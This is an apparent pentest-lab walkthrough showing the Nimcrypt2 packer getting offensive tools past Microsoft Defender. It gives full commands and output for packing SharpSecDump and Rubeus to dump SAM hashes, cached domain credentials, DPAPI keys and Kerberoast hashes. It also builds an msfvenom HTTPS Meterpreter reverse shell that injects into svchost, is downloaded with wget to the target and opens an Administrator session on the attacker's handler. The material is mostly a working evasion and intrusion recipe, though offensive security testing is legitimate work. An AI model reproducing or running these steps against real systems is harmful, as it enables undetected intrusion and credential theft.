================================================================================================================================================
Antivirus/EDR bypass using the packer 'NimCrypt2'
================================================================================================================================================

'NimCrypt2' is an awesome .NET, PE, & Raw Shellcode Packer/Loader Written in Nim and designed to bypass AV and EDR.

=> Source: https://github.com/icyguider/Nimcrypt2

Features
---------
 - Can load regular PE files as well as raw Shellcode
 - Sandbox evasion
 - AMSI bypass
 - ETW bypass
 - Use of direct syscalls 
 - Unhook ntdll.dll to bypass EDR detection (-u parameter)
 - AES Encryption with Dynamic Key Generation
 - String Encryption (-e parameter)
 - LLVM-Obfuscator Compatibility (-l parameter)
 - ...
 

================================================================================================================================================
Example 1 - The tool SharpSecDump is not detected nor blocked by Defender AV after being packed by Nimcrypt2
================================================================================================================================================

STEP 1 - Download the code of the tool SharSecDump from Github and compile it
------------------------------------------------------------------------------
> Source: https://github.com/G0ldenGunSec/SharpSecDump       
> The tool is .Net port of the remote SAM + LSA Secrets dumping functionality of impacket's secretsdump.py
> It is detected by the Microsoft Defender Antivirus.


STEP 2 - Pack the tool 'SharSecDump.exe' using NimCrypt2
---------------------------------------------------------

jeff@kali:~/Documents/Tools/Nimcrypt2-main/Nimcrypt2-main$ ./nimcrypt -h
                      ___                                                                                                                                  
                   .-'   `'.                                                                                                                               
                  /         \                                                                                                                              
                  |         ;                                                                                                                              
                  |         |           ___.--,                                                                                                            
         _.._     |0) ~ (0) |    _.---'`__.-( (_.                                                                                                          
  __.--'`_.. '.__.\    '--. \_.-' ,.--'`     `""`                                                                                                          
 ( ,.--'`   ',__ /./;   ;, '.__.'`    __                                                                                                                   
 _`) )  .---.__.' / |   |\   \__..--""  ""'--.,_                                                                                                           
`---' .'.''-._.-'`_./  /\ '.  \ _.-~~~````~~~-._`-.__.'                                                                                                    
      | |  .' _.-' |  |  \  \  '.               `~---`                                                                                                     
       \ \/ .'     \  \   '. '-._)                                  
        \/ /        \  \    `=.__`~-.   Nimcrypt v2               
   jgs  / /\         `) )    / / `"".`\                             
  , _.-'.'\ \        / /    ( (     / /  3-in-1 C#, PE, & Raw Shellcode Loader
   `--~`   ) )    .-'.'      '.'.  | (                              
          (/`    ( (`          ) )  '-;                             
           `      '-;         (-'                                   

Nimcrypt v 2.0

Usage:
  nimcrypt -f file_to_load -t csharp/raw/pe [-o <output>] [-p <process>] [-n] [-u] [-s] [-e] [-g] [-l] [-v] [--no-ppid-spoof]
  nimcrypt (-h | --help)

Options:
  -h --help     Show this screen.
  --version     Show version.
  -f --file filename     File to load
  -t --type filetype     Type of file (csharp, raw, or pe)
  -p --process process   Name of process for shellcode injection
  -o --output filename   Filename for compiled exe
  -u --unhook            Unhook ntdll.dll
  -v --verbose           Enable verbose messages during execution
  -e --encrypt-strings   Encrypt strings using the strenc module
  -g --get-syscallstub   Use GetSyscallStub instead of NimlineWhispers2
  -l --llvm-obfuscator   Use Obfuscator-LLVM to compile binary
  -n --no-randomization  Disable syscall name randomization
  -s --no-sandbox        Disable sandbox checks
  --no-ppid-spoof        Disable PPID Spoofing


jeff@kali:~/Documents/Tools/Nimcrypt2-main/Nimcrypt2-main$ ./nimcrypt -f ./SharpSecDump.exe -t csharp -o NimSharpSecDump.exe
                      ___                                           
                   .-'   `'.                                        
                  /         \                                       
                  |         ;                                       
                  |         |           ___.--,                     
         _.._     |0) ~ (0) |    _.---'`__.-( (_.                   
  __.--'`_.. '.__.\    '--. \_.-' ,.--'`     `""`                   
 ( ,.--'`   ',__ /./;   ;, '.__.'`    __                            
 _`) )  .---.__.' / |   |\   \__..--""  ""'--.,_                    
`---' .'.''-._.-'`_./  /\ '.  \ _.-~~~````~~~-._`-.__.'             
      | |  .' _.-' |  |  \  \  '.               `~---`              
       \ \/ .'     \  \   '. '-._)                                  
        \/ /        \  \    `=.__`~-.   Nimcrypt v2               
   jgs  / /\         `) )    / / `"".`\                             
  , _.-'.'\ \        / /    ( (     / /  3-in-1 C#, PE, & Raw Shellcode Loader
   `--~`   ) )    .-'.'      '.'.  | (                              
          (/`    ( (`          ) )  '-;                             
           `      '-;         (-'                                   

[+] NimlineWhispers2 enabled
[+] String encryption disabled
[+] Sandbox checks enabled
[+] Unhooking ntdll.dll disabled
[+] Verbose messages disabled
[+] Syscall name randomization enabled
Hint: used config file '/home/jeff/.choosenim/toolchains/nim-1.6.8/config/nim.cfg' [Conf]
Hint: used config file '/home/jeff/.choosenim/toolchains/nim-1.6.8/config/config.nims' [Conf]
..........................................................................................................................................................................................
/home/jeff/Documents/Tools/Nimcrypt2-main/Nimcrypt2-main/syscalls2.nim(5, 5) Hint: 'Value' should be: 'value' [Name]
/home/jeff/Documents/Tools/Nimcrypt2-main/Nimcrypt2-main/syscalls2.nim(6, 5) Hint: 'ValuePtr' should be: 'valuePtr' [Name]
/home/jeff/Documents/Tools/Nimcrypt2-main/Nimcrypt2-main/syscalls2.nim(8, 5) Hint: 'Attribute' should be: 'attribute' [Name]
<SNIP>
Hint: /usr/bin/x86_64-w64-mingw32-gcc -c -w -fmax-errors=3 -mno-ms-bitfields -DWIN32_LEAN_AND_MEAN -masm=intel -Os -fno-ident   -I/home/jeff/.choosenim/toolchains/nim-1.6.8/lib -I/home/jeff/Documents/Tools/Nimcrypt2-main/Nimcrypt2-main -o /home/jeff/.cache/nim/stub_r/@mstub.nim.c.o /home/jeff/.cache/nim/stub_r/@mstub.nim.c [Exec]
Hint:  [Link]
Hint: gc: refc; opt: size; options: -d:release
1270751 lines; 9.856s; 349.324MiB peakmem; proj: /home/jeff/Documents/Tools/Nimcrypt2-main/Nimcrypt2-main/stub.nim; out: /home/jeff/Documents/Tools/Nimcrypt2-main/Nimcrypt2-main/NimSharpSecDump.exe [SuccessX]

[+] Stub compiled successfully as NimSharpSecDump.exe


STEP 3 - Run the packed version of tool 'NimSharSecDump.exe' without being detected nor blocked by Defender AV
----------------------------------------------------------------------------------------------------------------

The tool is run on a Windows 10 laptop (with Defender AV enabled and up-to-date) and the target is a fully patched Windows 2016 of my pentest lab
(with Defender AV enabled and up-to-date).

C:\Users\Administrator\Documents\Tools-AD>NimSharpSecDump.exe -target=192.168.1.196  -u=administrator -p=superpasswordlabtest -d=.
[*] Running sandbox checks...
[*] Applying amsi patch: true
[*] Applying etw patch: true
[*] Decrypting packed exe...
[*] RemoteRegistry service started on 192.168.1.196
[*] Parsing SAM hive on 192.168.1.196
[*] Parsing SECURITY hive on 192.168.1.196
[*] Sucessfully cleaned up on 192.168.1.196
---------------Results from 192.168.1.196---------------
[*] SAM hashes
Administrator:500:aad3b435b51404eeaad3b435b51404ee:413eb6b2b7676<SNIP>
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c5<SNIP>
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16a<SNIP>
backup:1002:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a<SNIP>
auditor:1003:aad3b435b51404eeaad3b435b51404ee:08d30f5e8206ed215a<SNIP>
[*] Cached domain logon information(domain/username:hash)
COMPANY.WORK/svc_web_jenkins:$DCC2$10240#svc_web_jenkins#b839123<SNIP>
COMPANY.WORK/jeff.audit:$DCC2$10240#jeff.audit#35d2d7410df5dedbc<SNIP>
COMPANY.WORK/iurie.audit:$DCC2$10240#iurie.audit#b7433010e1d893d<SNIP>
COMPANY.WORK/alain.delon:$DCC2$10240#alain.delon#8087b82bfb8d9c7<SNIP>
[*] LSA Secrets
[*] $MACHINE.ACC
company.work\Webserver1$:aad3b435b51404eeaad3b435b51404ee:768b7d0147358572cb229d7<SNIP>
[*] DPAPI_SYSTEM
dpapi_machinekey:96a5b59df0f751eae938a4581684cc8<SNIP>
dpapi_userkey:a1f7f2b8a04f0fc20b67607f5951e7f48f<SNIP>
[*] NL$KM
NL$KM:6f11bbb5951aab1a3bf8bb712f79084c0b35eaea18c73ecad75aa4759920e644ce53902da5c<SNIP>
---------------Script execution completed---------------


================================================================================================================================================
Example 2 - The tool Rubeus is not detected nor blocked by Defender AV after being packed by Nimcrypt2
================================================================================================================================================

STEP 1 - Download the code of the tool Rubeus from Github and compile it
------------------------------------------------------------------------------
> Source: https://github.com/G0ldenGunSec/SharpSecDump    

> Note: I used an old version Rubeus that I modified a bit and that was not detected for a while by antivirus but unfortunately it is now detected 
by several antivirus such as Defender AV and Symantec.


STEP 2 - Pack the tool 'Rubeus.exe' using NimCrypt2
---------------------------------------------------------
jeff@kali:~/Documents/Tools/Nimcrypt2-main/Nimcrypt2-main$ ./nimcrypt -f ./Rubeus.exe -t csharp -o NimRubeus.exe
                      ___                                           
                   .-'   `'.                                        
                  /         \                                       
                  |         ;                                       
                  |         |           ___.--,                     
         _.._     |0) ~ (0) |    _.---'`__.-( (_.                   
  __.--'`_.. '.__.\    '--. \_.-' ,.--'`     `""`                   
 ( ,.--'`   ',__ /./;   ;, '.__.'`    __                            
 _`) )  .---.__.' / |   |\   \__..--""  ""'--.,_                    
`---' .'.''-._.-'`_./  /\ '.  \ _.-~~~````~~~-._`-.__.'             
      | |  .' _.-' |  |  \  \  '.               `~---`              
       \ \/ .'     \  \   '. '-._)                                  
        \/ /        \  \    `=.__`~-.   Nimcrypt v2               
   jgs  / /\         `) )    / / `"".`\                             
  , _.-'.'\ \        / /    ( (     / /  3-in-1 C#, PE, & Raw Shellcode Loader
   `--~`   ) )    .-'.'      '.'.  | (                              
          (/`    ( (`          ) )  '-;                             
           `      '-;         (-'                                   

[+] NimlineWhispers2 enabled
[+] String encryption disabled
[+] Sandbox checks enabled
[+] Unhooking ntdll.dll disabled
[+] Verbose messages disabled
[+] Syscall name randomization enabled
Hint: used config file '/home/jeff/.choosenim/toolchains/nim-1.6.8/config/nim.cfg' [Conf]
Hint: used config file '/home/jeff/.choosenim/toolchains/nim-1.6.8/config/config.nims' [Conf]
..........................................................................................................................................................................................
/home/jeff/Documents/Tools/Nimcrypt2-main/Nimcrypt2-main/syscalls2.nim(5, 5) Hint: 'Value' should be: 'value' [Name]
/home/jeff/Documents/Tools/Nimcrypt2-main/Nimcrypt2-main/syscalls2.nim(6, 5) Hint: 'ValuePtr' should be: 'valuePtr' [Name]
<SNIP>
Hint: /usr/bin/x86_64-w64-mingw32-gcc -c -w -fmax-errors=3 -mno-ms-bitfields -DWIN32_LEAN_AND_MEAN -masm=intel -Os -fno-ident   -I/home/jeff/.choosenim/toolchains/nim-1.6.8/lib -I/home/jeff/Documents/Tools/Nimcrypt2-main/Nimcrypt2-main -o /home/jeff/.cache/nim/stub_r/@m..@s..@s..@s..@s.choosenim@stoolchains@snim-1.6.8@slib@spure@srandom.nim.c.o /home/jeff/.cache/nim/stub_r/@m..@s..@s..@s..@s.choosenim@stoolchains@snim-1.6.8@slib@spure@srandom.nim.c [Exec]
Hint: /usr/bin/x86_64-w64-mingw32-gcc -c -w -fmax-errors=3 -mno-ms-bitfields -DWIN32_LEAN_AND_MEAN -masm=intel -Os -fno-ident   -I/home/jeff/.choosenim/toolchains/nim-1.6.8/lib -I/home/jeff/Documents/Tools/Nimcrypt2-main/Nimcrypt2-main -o /home/jeff/.cache/nim/stub_r/@mstub.nim.c.o /home/jeff/.cache/nim/stub_r/@mstub.nim.c [Exec]
Hint:  [Link]
Hint: gc: refc; opt: size; options: -d:release
1270751 lines; 15.251s; 349.383MiB peakmem; proj: /home/jeff/Documents/Tools/Nimcrypt2-main/Nimcrypt2-main/stub.nim; out: /home/jeff/Documents/Tools/Nimcrypt2-main/Nimcrypt2-main/NimRubeus.exe [SuccessX]


STEP 3 - Run the packed version of tool 'NimRubeus.exe' without being detected nor blocked by Defender AV
-----------------------------------------------------------------------------------------------------------

The tool is run on a Windows 2016 server (with Defender AV enabled and up-to-date) and the target is a fully patched Windows 2016 Domain Controller of my pentest lab
(with Defender AV enabled and up-to-date).


Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Users\alain>cd C:\
C:\>cd Temp_audit

C:\Temp_audit>NimRubeus.exe kerberoast
[*] Running sandbox checks...
[*] Applying amsi patch: true
[*] Applying etw patch: true
[*] Decrypting packed exe...

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.5.0


[*] Action: Kerberoasting

[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.

[*] Searching the current domain for Kerberoastable users

[*] Total kerberoastable users : 5


[*] SamAccountName         : svc_vulscanner
[*] DistinguishedName      : CN=svc vulnscanner,CN=Users,DC=company,DC=work
[*] ServicePrincipalName   : DC1/svc_vulnscanner.company.work:8080
[*] PwdLastSet             : 8/24/2022 7:21:41 PM
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash                   : $krb5tgs$23$*svc_vulscanner$company.work$DC1/svc_vulnscanner.company.work:8080*$
                             4F6C44F4BAD527B296A5CEBF77B81E47$BF3FE98BB007498921AB45D1E8D7826F4677303A2F912BF
                             90BAFA78A27DC707AB663AD7081F27859A3AC61E6B72397356726F432E963187E79EC909B51CBB93
                             D0CE1140A7E9E587509B5B0E665E1D2E7A1A88F70F08ADA5838DD5C6AEB0BE7C1D2C0BF709B8DC14
                             6BA9EE505D7E3D6451DCD54C5492B4D1DE452B56747449EFE67FD57ABDF07E40FC135ADDB3DA451C
                             332FE001A990A8052DEEF7C7DAFEAB5B2613B83900BCD294C17F4DB260BB9A0EEAA59D6EC5D22165
                             95011A9E9BAC4002B8380CBA7F8331EDBF606F0651A7ECA81BA84363E17A1E6BEC5E3CB6ECDED0E5
                             C4F7F68A6369D48AAC965D68A373DC6C7B434CDBE31D539E3176DB30939957F9025481BB98F01522
                             4A473740FEF51551125A319BB38624CB54AD76AC0D6EBB477E2D9051C0907B4CB92FBC09B648457B
                             2D44117A882945FE6B95424FEDCCA27D34B7DE2D92724822B1016183BFEA9FF7A52C93775C539C0C
                             B1CC79D3EBD8451389FB1951C4690BB6052A2B2AB0F541096F8D6780EF1B3B6B32172BF19CE8C99A
                             552F08074B1630E8245274DB385F3CAE6542FD69F0D5762CB071747036631845D0ED17C4C7933A4C
                             8F5836EC3D0B5ED2361A6A5D7B1A5222BFB705C3A2D619E3BAAC17A51437497E90A40B96CFCAB414
                             F6C73EB488C56E384E56CC11B9E5509B959F298B97418F400EB26F3444EFCED8D45ADB8F0DE6747B
                             58D04CADDC40EDC52CA882DCE61F6F774287F69FE7EA29B13385C3E3E663AA1552A805BE51047877
                             4562FBB44A7F3AC73D3D95441790FCA4E833B85A35494FFBB63B58A992512FD67C58E7B776E4F7EF
                             <SNIP>
                             

==========================================================================================================================================
Example 3 - Running a a stageless Meterpreter (x64) https reverse shell (packed by Nimcrypt2) without being detected by Defender AV
=======================================================================================================================================


STEP 1 - Generate a Meterpreter reverse shell HTTPS (x64 - stageless) using 'Msfvenom'
---------------------------------------------------------------------------------------

jeff@kali:~/Documents/Tools/Nimcrypt2-main/Nimcrypt2-main$ msfvenom -p windows/x64/meterpreter_reverse_https EXITFUNC=thread 
HandlerSSLCert=/home/jeff/Documents/Tools/Pivoting-with-MSF/pentest.pem LHOST=192.168.1.30 LPORT=443 -a x64 -f raw 
-o meterpreter-x64-stageless-reverse-https-raw.bin


STEP 2 - Use 'Nimcrypv2' to generate a packed version of the Meterpreter HTTPS reverse shell (x64)
---------------------------------------------------------------------------------------------------

jeff@kali:~/Documents/Tools/Nimcrypt2-main/Nimcrypt2-main$ ./nimcrypt -f ./meterpreter-x64-stageless-reverse-https-raw.bin -t raw -e 
-o NimRevShell4.exe -p svchost.exe
                      ___                                           
                   .-'   `'.                                        
                  /         \                                       
                  |         ;                                       
                  |         |           ___.--,                     
         _.._     |0) ~ (0) |    _.---'`__.-( (_.                   
  __.--'`_.. '.__.\    '--. \_.-' ,.--'`     `""`                   
 ( ,.--'`   ',__ /./;   ;, '.__.'`    __                            
 _`) )  .---.__.' / |   |\   \__..--""  ""'--.,_                    
`---' .'.''-._.-'`_./  /\ '.  \ _.-~~~````~~~-._`-.__.'             
      | |  .' _.-' |  |  \  \  '.               `~---`              
       \ \/ .'     \  \   '. '-._)                                  
        \/ /        \  \    `=.__`~-.   Nimcrypt v2               
   jgs  / /\         `) )    / / `"".`\                             
  , _.-'.'\ \        / /    ( (     / /  3-in-1 C#, PE, & Raw Shellcode Loader
   `--~`   ) )    .-'.'      '.'.  | (                              
          (/`    ( (`          ) )  '-;                             
           `      '-;         (-'                                   

[+] Using svchost.exe for shellcode injection
[+] GetSyscallStub enabled
[+] String encryption enabled
[+] Sandbox checks enabled
[+] Unhooking ntdll.dll disabled
[+] PPID spoofing enabled
[+] Verbose messages disabled
[+] Syscall name randomization enabled
Hint: used config file '/home/jeff/.choosenim/toolchains/nim-1.6.8/config/nim.cfg' [Conf]
Hint: used config file '/home/jeff/.choosenim/toolchains/nim-1.6.8/config/config.nims' [Conf]
......................................................................................................................................................................................
/home/jeff/Documents/Tools/Nimcrypt2-main/Nimcrypt2-main/GetSyscallStub.nim(6, 8) Hint: duplicate import of 'winim'; previous import here: /home/jeff/Documents/Tools/Nimcrypt2-main/Nimcrypt2-main/stub.nim(5, 8) [DuplicateModuleImport]
/home/jeff/Documents/Tools/Nimcrypt2-main/Nimcrypt2-main/GetSyscallStub.nim(7, 8) Hint: duplicate import of 'strutils'; previous import here: /home/jeff/Documents/Tools/Nimcrypt2-main/Nimcrypt2-main/stub.nim(9, 8) [DuplicateModuleImport]
/home/jeff/Documents/Tools/Nimcrypt2-main/Nimcrypt2-main/GetSyscallStub.nim(8, 8) Hint: duplicate import of 'ptr_math'; previous import here: /home/jeff/Documents/Tools/Nimcrypt2-main/Nimcrypt2-main/stub.nim(10, 8) [DuplicateModuleImport]
/home/jeff/Documents/Tools/Nimcrypt2-main/Nimcrypt2-main/GetSyscallStub.nim(12, 5) Hint: 'Value' should be: 'value' [Name]
/home/jeff/Documents/Tools/Nimcrypt2-main/Nimcrypt2-main/GetSyscallStub.nim(13, 5) Hint: 'ValuePtr' should be: 'valuePtr' [Name]
<SNIP>
Hint: gc: refc; opt: size; options: -d:release
1276946 lines; 14.689s; 347.035MiB peakmem; proj: /home/jeff/Documents/Tools/Nimcrypt2-main/Nimcrypt2-main/stub.nim; out: /home/jeff/Documents/Tools/Nimcrypt2-main/Nimcrypt2-main/NimRevShell4.exe [SuccessX]

[+] Stub compiled successfully as NimRevShell4.exe


STEP 3 - Download and execute the encrypted payload on a target Windows Server 2016 (with the MS Defender AV enabled & up-to-date)
---------------------------------------------------------------------------------------------------------------------------------------

jeff@kali:~/Documents/Tools/Nimcrypt2-main/Nimcrypt2-main$ python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
192.168.1.51 - - [31/Dec/2022 00:53:30] "GET / HTTP/1.1" 200 -
192.168.1.51 - - [31/Dec/2022 00:53:38] "GET /NimRevShell4.exe HTTP/1.1" 200 -

PS C:\Users\Administrator\Downloads> wget -URI http://192.168.1.30:8080/NimRevShell4.exe -OutFile NimRevShell4.exe

PS C:\Users\Administrator\Downloads> NimRevShell4.exe


STEP 4 - Enjoy the Meterpreter reverse shell running on the target Windows Server 2016 without being detected by the MS Defender AV
------------------------------------------------------------------------------------------------------------------------------------

jeff@kali:~$ sudo msfconsole -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter_reverse_https; set LHOST 192.168.1.30; set LPORT 443; set EXITFUNC thread; set ExitOnSession false; set SessionCommunicationTimeout 0; set EnableUnicodeEncoding true; set HandlerSSLCert /home/jeff/Documents/Tools/Pivoting-with-MSF/pentest.pem;  run -j"
[sudo] password for jeff: 

       =[ metasploit v6.1.14-dev                          ]
+ -- --=[ 2180 exploits - 1155 auxiliary - 399 post       ]
+ -- --=[ 596 payloads - 46 encoders - 10 nops            ]
+ -- --=[ 9 evasion                                       ]

Metasploit tip: View a module's description using 
info, or the enhanced version in your browser with 
info -d

[*] Starting persistent handler(s)...
[*] Using configured payload generic/shell_reverse_tcp
PAYLOAD => windows/x64/meterpreter_reverse_https
LHOST => 192.168.1.30
LPORT => 443
EXITFUNC => thread
ExitOnSession => false
SessionCommunicationTimeout => 0
EnableUnicodeEncoding => true
HandlerSSLCert => /home/jeff/Documents/Tools/Pivoting-with-MSF/pentest.pem
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Started HTTPS reverse handler on https://192.168.1.30:443
msf6 exploit(multi/handler) > [!] https://192.168.1.30:443 handling request from 192.168.1.51; (UUID: ckn6c1fm) Without a database connected that payload UUID tracking will not work!
[*] https://192.168.1.30:443 handling request from 192.168.1.51; (UUID: ckn6c1fm) Redirecting stageless connection from /jrHfVIB6ujjTu9K5sBSpgQ5DmY1wBQ9g_LZyG92t3M1w2fq4TO with UA 'Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko'
[*] https://192.168.1.30:443 handling request from 192.168.1.51; (UUID: ckn6c1fm) Attaching orphaned/stageless session...
[*] Meterpreter session 1 opened (192.168.1.30:443 -> 127.0.0.1 ) at 2022-12-31 00:54:34 +0100

msf6 exploit(multi/handler) > sessions -i 

Active sessions
===============

  Id  Name  Type                     Information                                  Connection
  --  ----  ----                     -----------                                  ----------
  1         meterpreter x64/windows  ORACLESERVER1\Administrator @ ORACLESERVER1  192.168.1.30:443 -> 127.0.0.1  (192.168.1.51)

msf6 exploit(multi/handler) > sessions -i 1
[*] Starting interaction with 1...

meterpreter > getuid
Server username: ORACLESERVER1\Administrator

meterpreter > background
[*] Backgrounding session 1...

<SNIP>
